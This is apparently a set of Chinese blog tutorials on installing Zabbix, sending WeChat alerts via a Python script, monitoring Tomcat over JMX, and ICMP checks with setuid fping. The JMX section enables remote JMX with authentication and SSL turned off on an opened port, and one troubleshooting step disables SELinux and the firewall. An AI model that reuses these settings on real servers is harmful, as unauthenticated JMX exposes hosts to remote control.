/usr/share/doc/zabbix-server-mysql-2.4.8/create 操作三条命令把数据导入到在指定的MySQL：zabbix 123mysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; schema.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; images.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; data.sql 4. 修改zabbix_server.conf 文件vim /etc/zabbix/zabbix_server.conf 1234567# ListenPort=10051 //监听的端口# LogFile=/var/log/zabbix/zabbix_server.log //日志文件路径# LogFileSize=0 //日志文件滚动，分割。（参数为“0”，不做滚动），例如当日志文件到达1G，会自动创建个新的日志文件，完成日志滚动。DBName=zabbix DBUser=zabbix #数据库用户名DBPassword=zabbix123.com #数据库密码AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts#zabbix运行脚本存放目录 :wq! #保存退出 12345678910111213#cp /etc/zabbix/zabbix_server.conf &#123;,.bak&#125; #备份ln -s /etc/alternatives/zabbix-server /usr/bin/zabbix-servercp /usr/sbin/zabbix_agentd /etc/init.d/zabbix_agentd[root@docker alternatives]# cp /etc/alternatives/zabbix_server /etc/init.d/zabbix-serverchmod +x /etc/rc.d/init.d/zabbix_server #添加脚本执行权限chmod +x /etc/rc.d/init.d/zabbix_agentd #添加脚本执行权限vim /etc/php.inidate.timezone = Asia/Shanghaipost_max_size = 32Mmax_execution_time = 300max_input_time = 300 5. 修改zabbix开机启动脚本中的zabbix安装目录123456vi /etc/rc.d/init.d/zabbix_server #编辑服务端配置文件BASEDIR=/usr/local/zabbix/ #zabbix安装目录# /etc/init.d/zabbix-server start# /etc/init.d/zabbix_agentd start#/etc/init.d/httpd start 6.1 添加开机启动服务1234chkconfig --add zabbix-server chkconfig --add zabbix-agent chkconfig --add httpd chkconfig --add mysqld 6.2 添加开机启动1234chkconfig zabbix-server on chkconfig zabbix-agent on chkconfig httpd on chkconfig mysqld on 6.3 添加防火墙123-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 10051 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 10050 -j ACCEPT 7.在浏览器中打开：http://192.168.1.183/zabbix/进入设置界面 进入： “/var/www/html/zabbix/conf/zabbix.conf.php” 备份： cp zabbix.conf.php.example zabbix.conf.php下载下来的放到这个目录下面。 用户名:Admin 密码：zabbix 设置中文版本，2.4版本以后都支撑中文版本，2.2.0版本都是不支持的，需要下载中文版本包，放到zabbix目录下面。 设置背景为经典的是不是看着会舒服点：3.0 对外观改的改动很大，支撑硬件监控功能加强。 简单的安装就已经搞定了。 安装出现几种错误情况：登陆zabbix提示zabbix server is not running:the information displayedmay not be current 解决方法： 12关闭selinux与iptablesvim /var/www/html/zabbix/conf/zabbix.conf.php将zabbix.conf.php里的server写成ip地址，就解决了 查看日志： 126576:20160719:045354.989 [Z3001] connection to database 'zabbix' failed: [2002] Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2) 这个报错的话，就说明配置文件有问题： 设置数据库访问地址：DBHost=192.168.1.170 然后vi zabbix.conf.php记得修改： 123$ZBX_SERVER = 'ZABBIX_SERVER_IP'; IP地址$ZBX_SERVER_PORT = '10051'; 然后重启下服务，就不会出现MySQL本地无法连接。 如果报错： 16664:20160719:050257.665 cannot send list of active checks to [127.0.0.1]: host [Zabbix server] not monitored 确保zabbix前台上的Host name与主机的hostname一致即可。 这是快速简单安装2.4.8版本的，后面还有编译安装的，编译安装的好处，可以了解安装的路径和配置文件都是自己熟悉的。 2.4.8服务端编译安装与部署： 2.4.8升级3.0安装与部署： 3.0安装与部署： 安装完成以后出现图像乱码： https://github.com/yangcvo/zabbix.2.4 2.4.8版本zabbix-server服务端编译安装：源码编译安装部署2.4.8版本zabbix-server服务端","link":"/2014/10/03/性能监控/Zabbix/zabbix2.4服务端yum-rpm快速安装部署/"},{"title":"zabbix3.0实现微信报警","text":"前言： 因为我已经在测试环境和·生产环境·都实现了微信和邮件告警。今天有空就写了篇文档后期可以在复习下，现实生产环境中，我们通常使用邮件和短信接受zabbix报警信息，但是邮件经常被工作人员搁置在角落中甚至被设置为垃圾邮件被过滤掉。公司的短信接口又太贵，复杂环境中使用短息报警会使运维成本增加很多。微信提供了很好的第三方接口，我们可以利用微信报警以求降低运维成本。 这里我现在公司也用第三方的电话短信猫做告警，严重的故障会用短信来发送到指定的运维人员。这样即使微信和邮件都没有打开收到，短信和电话会第一时间通知。 微信告警的好处：第一：可以及时通知时间通知运维人员。及时的解决故障。 第二：下班周末课余时间可以准时接收到。 安装与配置：微信的第三方接口要求我们先申请一个企业号——传送门：微信企业公众号平台 第一步：申请微信公众号 这里跟微信绑定后期登陆只需要扫描下二维码就可以了。 如何申请也可参考这篇文档：申请微信公众号 如何操作企业号？1.通讯录添加企业成员 我们要提前把成员信息添加进组织部门，必填项+手机号或者微信号，这样别人扫描二维码的时候才能成功关注企业号。注意：这里有两个我们要用到信息，一个组织部门的ID，一个部门成员的账号（账号是自己手动指定的，不同于微信号，最好是字母加数字） 2.应用中心创建应用 我们要在这里创建应用，因为要通过应用发送消息给部门成员 注意：这里要记住一个值，应用ID 3.给部门设置管理员 设置---&gt;功能设置----&gt;权限管理----&gt;新建管理组 管理员必须事先已经关注了企业号，并且已经设置好邮箱地址 确定管理员可以读取通讯录，可以使用应用发消息。 注意：我们需要管理员的CorpID和Secret 我们要准备这些东西： 一个微信企业号 企业号已经被部门成员关注 企业号里有一个可以发消息的应用 一个授权管理员，可以使用该应用给成员发消息 我们要取到这些信息： 成员账号 组织部门ID 应用ID CropID Secret 如何调用微信接口？ 调用微信接口需要一个调用接口的凭证：access_token 通过 ：CropID 、Secret 才能获取到access_token，但是获取到的token有效期为两分钟 微信企业号接口调试工具传送门：http://qydev.weixin.qq.com/debug 测试是否可通： 使用： curl -s -G url 获取 AccessToke 使用： curl --data url 传送凭证调用企业号接口 这里出现一个问题： curl -s -G url 获取 AccessToke时候为什么我在用企业号发送消息的时候总是返回{&quot;errcode&quot;:41004,&quot;errmsg&quot;:&quot;corpsecret missing”}呢？ 主要原因： 123“41004”说明：缺少secret参数，请排查相关问题。用“”把url括起来就OK，即curl -s -G \"url\"，估计你已经解决了，帮助后来者吧。 这个问题很棘手，一开始弄搞了一个半个小时后面看到一篇过来人的文章帮助了我：这里我也贴出来了。参考文档 python脚本原理 使用： self.__corpid = corpid 使用： self.__secret = secret 传送凭证调用企业号接口 脚本已贴出来了，可以下载 weixin.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990**#!/usr/bin/env python# -*- coding: utf-8 -*-import urllib,urllib2,jsonimport sysimport loggingreload(sys)sys.setdefaultencoding( \"utf-8\" )class WeChat(object): __token_id = '' # init attribute def __init__(self,url): self.__url = url.rstrip('/') self.__corpid = 'xxx' self.__secret = 'xxx' # Get TokenID def authID(self): params = &#123;'corpid':self.__corpid, 'corpsecret':self.__secret&#125; data = urllib.urlencode(params) content = self.getToken(data) try: self.__token_id = content['access_token'] # print content['access_token'] except KeyError: raise KeyError # Establish a connection def getToken(self,data,url_prefix='/'): url = self.__url + url_prefix + 'gettoken?' try: response = urllib2.Request(url + data) except KeyError: raise KeyError result = urllib2.urlopen(response) content = json.loads(result.read()) return content # Get sendmessage url def postData(self,data,url_prefix='/'): url = self.__url + url_prefix + 'message/send?access_token=%s' % self.__token_id request = urllib2.Request(url,data) try: result = urllib2.urlopen(request) except urllib2.HTTPError as e: if hasattr(e,'reason'): print 'reason',e.reason elif hasattr(e,'code'): print 'code',e.code return 0 else: content = json.loads(result.read()) result.close() return content # send message def sendMessage(self,touser,message): self.authID() data = json.dumps(&#123; 'touser':touser, 'toparty':\"3\", 'msgtype':\"text\", 'agentid':\"3\", 'text':&#123; 'content':message &#125;, 'safe':\"0\" &#125;,ensure_ascii=False) response = self.postData(data) log_file = \"/home/zabbix/weixin.log\" logging.basicConfig(filename=log_file,filemode='a',level=logging.DEBUG) logging.info(data) logging.debug(response) print responseif __name__ == '__main__': if len(sys.argv) != 4: print 'error segments, now exit' sys.exit() a = WeChat('https://qyapi.weixin.qq.com/cgi-bin') a.sendMessage(sys.argv[1],sys.argv[3]) log_file = &quot;/home/zabbix/weixin.log&quot; 微信日志 &apos;toparty&apos;:&quot;3&quot;, &apos;agentid&apos;:&quot;3&quot;, 这里3 是我这边应用ID 3 touser否成员ID列表（消息接收者，多个接收者用‘|’分隔，最多支持1000个）。特殊情况：指定为@all，则向关注该企业应用的全部成员发送 toparty否部门ID列表，多个接收者用‘|’分隔，最多支持100个。当touser为@all时忽略本参数 totag否标签ID列表，多个接收者用‘|’分隔。当touser为@all时忽略本参数 msgtype是消息类型，此时固定为：text agentid是企业应用的id，整型。可在应用的设置页面查看 content是消息内容 safe否表示是否是保密消息，0表示否，1表示是，默认0 &quot;touser&quot;:&quot;touser&quot;, #企业号中的用户帐号，在zabbix用户Media中配置，如果配置不正常，将按部门发送。 文中使用的用户, toparty 部门iD为3，agentid 应用ID为3. 为什么要这样写脚本？因为微信企业号开放的端口有固定的格式限制 企业号支持的格式：http://qydev.weixin.qq.com/wiki/index.php?title=消息类型及数据格式 将脚本放入zabbix默认执行路径下 mv weixin.sh /usr/local/zabbix/share/zabbix/alertscripts chown zabbix.zabbix /usr/local/zabbix/share/zabbix/alertscripts/weixin.py chmod +x /usr/local/zabbix/share/zabbix/alertscripts/weixin.py 到这里上面基本的已经配置完毕了。 测试脚本是否可以发送成功消息12[root@salt alertscripts]# python weixin.py test world!&#123;u'errcode': 60011, u'errmsg': u'no privilege to access/modify contact/party/agent '&#125; 出现我是企业号体验账户 我发送消息：微信错误 errcode=60011. 可参考：微信错误 errcode=60011 我这里的原因是应用ID一开始写1，后来改成3测试就通了。 12[root@salt alertscripts]# python weixin.py test hello world!&#123;u'invaliduser': u'all user invalid', u'errcode': 0, u'errmsg': u'ok'&#125; 这里用户关注了以后： 12[root@salt alertscripts]# python weixin.py jinyu hello world!&#123;u'errcode': 0, u'errmsg': u'ok'&#125; web服务端配置：至此工具安装完成，在zabbix界面里添加脚本告警 设置脚本，脚本名称为工具名称，设置好点添加按钮 添加新的报警媒介到用户，我以Admin用户为例 添加 选择刚才的媒介，收件人为我提供的UserID，多个用户用｜隔开 添加后一点要点更新 我们在这里独立设置一个Action，当然你也可以在默认的Action里添加 名称为weixin 告警消息的格式，大家可以根据自己需求具体设置，下面是我的设置 默认接收人：故障{TRIGGER.STATUS},服务器:{HOSTNAME1}发生: {TRIGGER.NAME}故障! 默认信息： 123456789101112131415161718192021告警主机:&#123;HOSTNAME1&#125;告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;告警等级:&#123;TRIGGER.SEVERITY&#125;告警信息: &#123;TRIGGER.NAME&#125;告警项目:&#123;TRIGGER.KEY1&#125;问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;事件ID:&#123;EVENT.ID&#125;恢复主旨：恢复&#123;TRIGGER.STATUS&#125;, 服务器:&#123;HOSTNAME1&#125;: &#123;TRIGGER.NAME&#125;已恢复!恢复信息：告警主机:&#123;HOSTNAME1&#125;告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;告警等级:&#123;TRIGGER.SEVERITY&#125;告警信息: &#123;TRIGGER.NAME&#125;告警项目:&#123;TRIGGER.KEY1&#125;问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;当前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;事件ID:&#123;EVENT.ID&#125; 切换到操作标签，添加操作选择发送到Admin用户，只使用weixin，选择好之后点添加,这里我已经添加过了，所以提示更新。设置好之后如下，点添加 经过以上步骤，就完成了配置，就可以使用zabbix来告警啦，用dd命令测试下磁盘i/o告警，一会就会看到微信上发过来的告警信息 dd if=/dev/zero of=/tmp/test2.img bs=1024M count=1000 oflag=dsync 课外普及：普及： 如何正确使用dd工具测试磁盘的I/O速度 一般情况下，我们都是使用dd命令创建一个大文件来测试磁盘的读写速度。但是，很多人都存在一个误区，以为dd命令显示的速度就是磁盘的写入速度，其实这是不然的。我们分析一下dd命令是如何工作的。 dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 这种情况下测试显示的速度是dd命令将数据写入到内存缓冲区中的速度，只有当数据写入内存缓冲区完成后，才开始将数据刷入硬盘，所以这时候的数据是无法正确衡量磁盘写入速度的。 dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1;sync 这种情况下测试显示的跟上一种情况是一样的，两个命令是先后执行的，当sync开始执行的时候，dd命令已经将速度信息打印到了屏幕上，仍然无法显示从内存写硬盘时的真正速度。 dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 conv=fdatasync 这种情况加入这个参数后，dd命令执行到最后会真正执行一次“同步(sync)”操作，所以这时候你得到的是读取这128M数据到内存并写入到磁盘上所需的时间，这样算出来的时间才是比较符合实际的。 dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 oflag=dsync 这种情况下，dd在执行时每次都会进行同步写入操作。也就是说，这条命令每次读取1M后就要先把这1M写入磁盘，然后再读取下面这1M，一共重复128次。这可能是最慢的一种方式，基本上没有用到写缓存(write cache)。 总结： 建议使用测试写速度的方式为： dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 conv=fdatasync 建议使用测试读速度的方式为： dd if=/xiaohan/test.iso of=/dev/zero bs=1024M count=1 iflag=direct *注：要正确测试磁盘读写能力，建议测试文件的大小要远远大于内存的容量！！！ PS：后续计划1.后续可能会增加发送次数计数，方便管理用户 2.添加查询操作到微信，针对用户定制开发。可通过微信查询zabbix服务器里监控主机的状态，通过微信简单操作zabbix。 预览 注意事项及报错处理 #Zabbix-web页面新增用户权限处理，发送对象选择（用户的名称） #应用当中可见范围选择注意（选这要发送的对象（部门，及部门成员）） zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","link":"/2016/06/22/性能监控/Zabbix/zabbix3-0实现微信报警/"},{"title":"zabbix3.0部署jmx监控tomcat","text":"zabbix提供了一个java gateway的应用去监控jmx（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用。 一. Zabbix 的JMX监控架构 一：部署环境123Centos 6.7Zabbix 3.0.3Tomcat 7.0.55 服务端配置1、安装jdk（版本1.7.0_79）JDK 各自的版本7.0 还是8.0 版本官网下载：JDK 我这里也上传了7.0.67 版本的和8.0版本的jdk源码包： 7.0JDK源码包 8.0JDK源码包 并上传到zabbix server 直接解压下载下来的包到自定义的目录： 1tar -zxvf jdk1.7.0_67.tar.gz -C /srv/ 安装成功之后添加系统环境变量 123456cd /etc/profile.dvim java.shexport JAVA_HOME=/srv/jdk1.7.0_67export CLASS_PATH=\"$JAVA_HOME/lib:$JAVA_HOME/jre/lib\"export PATH=$PATH:$JAVA_HOME/bin 使配置生效 1source /etc/profile 安装与配置比较简单。执行java -version命令，出现类似界面表示成功。 1234java -versionjava version \"1.7.0_67\"Java(TM) SE Runtime Environment (build 1.7.0_67-b01)Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode) 如果出现问题，查看下环境变量是否设置。 2、安装Zabbix-Java-gatewayZabbix2.0起添加了支持用于监控JMX应用程序的服务进程，称为“Zabbix-Java-gateway”，它是用java写的一个程序。 可使用rpm进行安装，我使用源码安装，大家可在安装zabbix时启用–enable-java参数即可安装zabbix java gateway，如果第一次没有加载，可重新加载编译安装 有两种方法可以安装Zabbix-Java-gateway，第1种是编译安装zabbix时添加–enable java参数。第2种是单独安装，步骤如下： 第一种方法： 安装gateway，需要java，java-devel依赖 123yum install －ｙ http://repo.zabbix.com/zabbix/2.4/rhel/6/x86_64/zabbix-release-2.4-1.el6.noarch.rpm 安装yum源yum install -y java java-devel zabbix-java-gateway 安装gateway 测试是否成功： 第一：测试java是否成功 1234java -versionjava version \"1.7.0_67\"Java(TM) SE Runtime Environment (build 1.7.0_67-b01)Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode) 第二：测试gateway是否安装成功 12service zabbix-java-gateway statuszabbix-java-gateway is stopped 第二种方法： 我这里升级3.0.3版本的时候已经安装好了。所以如果没有安装上的可以单独安装没关系的： 不受影响步骤如下： 1234# tar zxvf zabbix-3.0.3.tar.gz# cd zabbix-3.0.3# ./configure --enable-java --prefix=/data/zabbix/zabbix_java #/data/zabbix是我的zabbix安装目录# make &amp;&amp; make install 我的目录是默认在/usr/local/zabbix/sbin/zabbix_java/ 3、修改Java-gateway的配置文件并启动它配置文件单独安装的路径为/data/zabbix/zabbix_java/sbin/zabbix_java/settings.sh我这里是这个目录。具体根据实际安装情况） /usr/local/zabbix/sbin/zabbix_java/settings.sh启用以下参数： 123LISTEN_IP=\"127.0.0.1\" #监听地址LISTEN_PORT=10052 #监听端口START_POLLERS=50 # 开启的工作线程数（必须大于等于后面zabbix_server.conf文件的StartJavaPollers参数） #必须配置，启动的进出数 注意事项： 配置文件PID_FILE的路径必须是正确的，可以自己去cd找，yum安装默认情况下不用改动。 START_POLLERS项是配置启动的进出数，该值必须大于等于Zabbix-Server里面的startJavaPollers项。 进入/usr/local/zabbix/sbin/zabbix_java/目录，执行./startup.sh 检查端口是否监听： 12netstat -anp|grep 10052tcp 0 0 0.0.0.0:10052 0.0.0.0:* LISTEN 21949/java 查看是否已经监听10052端口，如果已监听，表示启动成功，如果没有，可通过zabbix_server日志查看解决 4、修改zabbix_server的配置文件并重启12345vim /usr/local/zabbix/etc/zabbix_server.confJavaGateway=127.0.0.1 # JavaGateway 服务器地址，zabbix_server与zabbix_java_gateway在同一台主机JavaGatewayPort=10052 #端口StartJavaPollers=5 # #设定连接java gateway 的进程数，当设置为0时表示不具有抓取java信息的能力 5、 添加catalina-jmx-remote.jar添加catalina-jmx-remote.jar到zabbix java gateway的lib目录下，catalina-jmx-remote.jar包可在http://archive.apache.org/dist/tomcat/下，在各版本目录的bin/extras/子目录下 12cd /usr/local/zabbix/sbin/zabbix_java/lib/wget http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.55/bin/extras/catalina-jmx-remote.jar 重启服务zabbix和java gateway 并加入启动项并验证： 123/etc/init.d/zabbix_server restart/usr/local/zabbix/sbin/zabbix_java/shutdown.sh/usr/local/zabbix/sbin/zabbix_java/startup.sh 6.下载测试工具cmdline-jmxclient-0.10.3.jarcmdline-jmxclient-0.10.3.jar为一个测试工具，可用来测试jmx是否配置正确，下载cmdline-jmxclient-0.10.3.jar(下载到任意目录) 1wget http://crawler.archive.org/cmdline-jmxclient/cmdline-jmxclient-0.10.3.jar 二、被监控tomcat 配置［被监控tomcat操作］下载catalina-jmx-remote.jar1234cd /srv/tomcat/tomcat-account/lib/wget http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.55/bin/extras/catalina-jmx-remote.jar #我的tomcat版本是7.0.55chown -R tomcat:tomcat catalina-jmx-remote.jarchmod +x catalina-jmx-remote.jar 我的tomcat版本是7.0.55 将下载后后的jar包放到被监控的tomcat实例的lib目录下。 查看tomcat的版本 这里之前也自己也忘记了tomcat的版本是多少了，所以我先查看下然后在下载： 123456789101112131415cd /srv/tomcat/tomcat_account/bin[root@tomcat_A1 bin]# ./version.sh --Using CATALINA_BASE: /srv/tomcat/tomcat_accountUsing CATALINA_HOME: /srv/tomcat/tomcat_accountUsing CATALINA_TMPDIR: /srv/tomcat/tomcat_account/tempUsing JRE_HOME: /srv/jdk1.7.0_67Using CLASSPATH: /srv/tomcat/tomcat_account/bin/bootstrap.jar:/srv/tomcat/tomcat_account/bin/tomcat-juli.jarServer version: Apache Tomcat/7.0.55Server built: Jul 18 2014 05:34:04Server number: 7.0.55.0OS Name: LinuxOS Version: 2.6.32-573.8.1.el6.x86_64Architecture: amd64JVM Version: 1.7.0_67-b01JVM Vendor: Oracle Corporation 在tomcat端配置JMX。（tomcat/bin/catalina.sh）自己安装的tomcat路径，找到catalina.sh文件。 网上很多人修改tomcat/bin/下的catalina.sh，添加如下内容： 12345CATALINA_OPTS=\"-Dcom.sun.management.jmxremote-Dcom.sun.management.jmxremote.authenticate=false-Dcom.sun.management.jmxremote.ssl=false-Dcom.sun.management.jmxremote.port=12345 #定义jmx监听端口-Djava.rmi.server.hostname=192.168.7.186\" 我这里是直接在bin目录下面创建自定义的脚本。 修改setenv.shvi /srv/tomcat/tomcat-account/bin/setenv.sh 添加如下 12345CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Djava.rmi.server.hostname=192.168.7.186\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Djavax.management.builder.initial=\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Dcom.sun.management.jmxremote=true\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Dcom.sun.management.jmxremote.ssl=false\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Dcom.sun.management.jmxremote.authenticate=false\" 注意：hostname位机器ip地址，即被监控机器对外服务地址 3.修改server.xmlvi /opt/apache-tomcat/conf/server.xml添加如下，注意添加位置在 1&lt;Listener className=\"org.apache.catalina.core.ThreadLocalLeakPreventionListener\" /&gt; 之后添加如下代码 1&lt;Listener className=\"org.apache.catalina.mbeans.JmxRemoteLifecycleListener\" rmiRegistryPortPlatform=\"12345\" rmiServerPortPlatform=\"12345\" /&gt; 3、重启tomcat这里我之前是用写好的启动脚本去启动的，发现一个问题。因为我都是用/etc/init.d/tomcat stop start 来启动。可是发现服务启动了，可是之前的tomcat服务端口不见了。我之前的tomcat服务端口10001 然后查看日志出现报错： 123456789101112131415161718192021 at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.commons.daemon.support.DaemonLoader.start(DaemonLoader.java:243)Caused by: java.lang.IllegalArgumentException: jmxremote.access (没有那个文件或目录) at javax.management.remote.rmi.RMIConnectorServer.start(RMIConnectorServer.java:373) at org.apache.catalina.mbeans.JmxRemoteLifecycleListener.createServer(JmxRemoteLifecycleListener.java:313) at org.apache.catalina.mbeans.JmxRemoteLifecycleListener.lifecycleEvent(JmxRemoteLifecycleListener.java:259) at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117) at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90) at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402) at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:347) at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:732) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150) ... 11 moreCaused by: java.io.FileNotFoundException: jmxremote.access (没有那个文件或目录) at java.io.FileInputStream.open(Native Method) at java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:146) at java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:101) at com.sun.jmx.remote.security.MBeanServerFileAccessController.propertiesFromFile(MBeanServerFileAccessController.java:294) at com.sun.jmx.remote.security.MBeanServerFileAccessController.&lt;init&gt;(MBeanServerFileAccessController.java:133) at javax.management.remote.rmi.RMIConnectorServer.start(RMIConnectorServer.java:371) ... 19 more 这里先kill -9 tomcat进程只需要在/bin/目录下面启动服务。./startup.sh然后查看有下面的12345 12346 进程 和tomcat进程10001 说明就对了。 1234567891011121314[root@tomcat_A1 bin]# netstat -ntulpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 10.46.72.172:10050 0.0.0.0:* LISTEN 8483/zabbix_agentdtcp 0 0 127.0.0.1:8006 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:4041 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:10001 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1363/sshdtcp 0 0 0.0.0.0:36440 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:12345 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:12346 0.0.0.0:* 1374/ntpdudp 0 0 10.46.72.172:123 0.0.0.0:* 1374/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1374/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1374/ntpd 重启zabbix agent 1service zabbix-agent restart 注：防火墙需要开放12345，12346端口 12-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 12345 -j ACCEPT-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 12346 -j ACCEPT ###4、服务端测试是否可以获取数据 命令行下测试需要cmdline-jmxclient-0.10.3.jar这个包，测试结果如下： 这个包下载地址:cmdline-jmxclient-0.10.3.jar 在zabbix server上执行 1java -jar /tmp/cmdline-jmxclient-0.10.3.jar - 192.168.7.186:12345 java.lang:type=Memory NonHeapMemoryUsage 如果有如下回显表示jmx配置正确，如不正确，请检查配置,看下端口启动是否正常，server.xml 配置。 1234507/22/2016 14:45:28 +0800 org.archive.jmx.Client NonHeapMemoryUsage:committed: 80347136init: 24576000max: 136314880used: 46634984 写个脚本自动判断： 123vim context.sh#!/bin/bashjava -jar /opt/tomcat/cmdline-jmxclient-0.10.3.jar - 10.46.72.172:12345 Catalina:type=Manager,*| awk -F \",\" '&#123; print $1 &#125;'|awk -F: '&#123; print $2 &#125;'&gt;/tmp/tomcat/context.csv 三、导入模板到zabbix，并关联到主机，添加监控这样也可以选择系统自带的，我这里zabbix版本是3.0的，系统自带的可以选择：选择配置：主机-模板-选择-模板-：Template JMX TomcatTemplate JMX Generic 从网上下载了一个不错的模板，导入后如下： 导入模板以后主机添加端口： 然后查看图形： 就有了。 四、如何监控单主机多个tomcat监控多个tomcat实例，网上的详细的配置文档很少，几乎没有。比较好的办法是使用自动发现，但刚使用zabbix，来不及研究，所以采用笨法，修改模板、监控项、图形来达到最终目的。关键配置：1、添加主机时添加多个jmx端口 2、修改监控项、键值在同一主机上，zabbix不允键值重复，但是监控的项目是一样的，不可能键值写的不重复，经过几番搜索，找到方法如下：只要在箭头处添加1个空格就可以，也可以是多个。（注意位置不要错，在逗到后面） 剩下的就是体力活了，克隆监控项、修改监控项、克隆图形、修改图形。。。以下是两个tomcat实例的监控项： 多个tomcat在一台主机上面最后的监控效果如下： 一开始zabbix监控tomcat 一路顺畅，可是到测试正不正常时候，返回拒绝连接，第一时间想到就是配置有问题： 我是参考这个解决了。 具体参数内容请参考 apache tomcat 文档 也非常感谢：张爱德大神 一路zabbix上面的帮我一起排坑： zabbix大神 他的博客blog：https://blog.cactifans.com","link":"/2016/06/21/性能监控/Zabbix/zabbix3-0部署jmx监控tomcat/"},{"title":"zabbix的ICMP_Ping模版实现对客户端网络状态的监控","text":"上一次搭建了邮件告警和微信告警，可以很方便及时接收到告警的。这里讲zabbix里面ICMP-ping模板的实现网络监控。 Zabbix使用外部命令fping处理ICMP ping的请求，fping不包含在zabbix的发行版本中，需要额外去下载安装fping程序，安装完毕之后需要在zabinx_server.conf中的参数FpingLocation配置fping安装的路径。 由于fping默认是root权限工作，而zabbix-server是zabbix用户运行的，所以需要对fping程序设置setuid权限，如果在自定义key的时候需要用到netstat命令，也同样要设置setuid，否则不能获取到数据，而在日志中提示权拒绝。 一、登陆Zabbix服务器做以下操作：1.fping安装 12345wget http://www.fping.org/dist/fping-3.10.tar.gztar zxvf fping-3.10.tar.gzcd fping-3.10./configure --prefix=/usr/local/fping/make &amp;&amp; make install 2.修改zabbix_server.conf配置文件 12345vim /usr/local/zabbix/etc/zabbix_server.conf把FpingLocation路径修改为刚安装的fping路径。FpingLocation=/usr/local/fping/sbin/fping 如果不修改zabbix_server.conf配置件需要使用软连接到/usr/local/sbin/fping，zabbix默认fping的路径是/usr/sbin/fping 12ln -s /usr/sbin/fping /path/to/non-existant/fpingln -s /usr/sbin/fping6 /path/to/non-existant/fping6 3.修改fping权限（如果不设下面权限，zabbix服务端会采集不到数据） 12# chown root:zabbix /usr/local/fping/sbin/fping# chmod 4710 /usr/local/fping/sbin/fping 安装完fping，设置好zabbix-server 配置文件，需要重启服务。 1service zabbix_server restart #重启服务 4.zabbix用户测试fping命令 12/usr/local/fping/sbin/fping www.baidu.comwww.baidu.com is alive # 说明命令返回成功。 二、登陆Zabbix监控网页做以下设置打开zabbix-configuration-host-creat 1.host添加需要监控的ip地址,这里就不介绍了。 2.选择模版template icmp ping 3.添加Graphs 添加完以后可以查看对应的机器图形： 四、触发器模版已自带，设置报警方式后就可以接收报警邮件了。 zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 